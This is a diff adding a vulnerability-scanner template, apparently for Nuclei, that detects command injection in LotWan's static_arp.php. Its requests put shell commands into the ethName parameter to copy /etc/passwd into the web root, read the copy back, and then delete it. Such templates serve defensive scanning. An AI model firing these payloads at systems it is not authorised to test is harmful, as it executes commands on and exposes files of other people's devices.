@@ -1,0 +1,48 @@
+id: lotwan-static-arp-rce
+info:
+  name: LotWan static_arp.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    LotWan WAN optimization system static_arp.php file has command execution vulnerabilities, allowing attackers to execute arbitrary commands and obtain system permissions.
+  tags: rce, lotwan
+  reference:
+    - https://www.appexnetworks.com.cn
+
+variables:
+  rand_name: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /acc/bindipmac/static_arp.php?ethName=||cat%20/etc/passwd>{{rand_name}}.txt|| HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status: [200]
+
+  - raw:
+      - |
+        GET /acc/bindipmac/{{rand_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+  - raw:
+      - |
+        GET /acc/bindipmac/static_arp.php?ethName=||rm%20-f%20{{rand_name}}.txt|| HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status: [200]
